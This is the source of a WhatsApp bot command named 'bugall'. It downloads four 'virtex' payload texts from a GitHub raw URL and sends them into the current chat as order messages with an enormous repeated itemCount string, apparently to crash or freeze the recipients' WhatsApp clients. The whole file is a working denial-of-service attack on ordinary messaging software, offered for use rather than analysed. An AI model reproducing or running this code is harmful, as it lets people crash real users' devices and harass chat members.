let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i

let handler = async (m, { conn, text, args }) => {
   target = m.chat
    await conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0}).catch(console.log);
virtex = await require('node-fetch')('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/1.txt').then(v => v.text());
virtex2 = await require('node-fetch')('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/2.txt').then(v => v.text());
virtex3 = await require('node-fetch')('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/3.txt').then(v => v.text());
virtex4 = await require('node-fetch')('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/4.txt').then(v => v.text());

yahaha = await conn.prepareMessageFromContent(target, {
   orderMessage: {
    itemCount: "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999".repeat(9999), // Bug
    status: "INQUIRY",
   surface: "CATALOG",
    message: virtex,
    orderTitle: 'MAMPUS', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }, {});
  
keren = await conn.prepareMessageFromContent(target, {
   orderMessage: {
    itemCount: "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999".repeat(9999), // Bug
    status: "INQUIRY",
   surface: "CATALOG",
    message: virtex2,
    orderTitle: 'MAMPUS', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }, {});
  
  wow = await conn.prepareMessageFromContent(target, {
   orderMessage: {
    itemCount: "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999".repeat(9999), // Bug
    status: "INQUIRY",
   surface: "CATALOG",
    message: virtex3,
    orderTitle: 'MAMPUS', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }, {});
  
  hayyuk = await conn.prepareMessageFromContent(target, {
   orderMessage: {
    itemCount: "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999".repeat(9999), // Bug
    status: "INQUIRY",
   surface: "CATALOG",
    message: virtex4,
    orderTitle: 'MAMPUS', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }, {});

await conn.relayWAMessage(yahaha);
await conn.relayWAMessage(keren);
await conn.relayWAMessage(wow);
await conn.relayWAMessage(hayyuk);

}

handler.command = /^bugall$/i
handler.rowner = true
module.exports = handler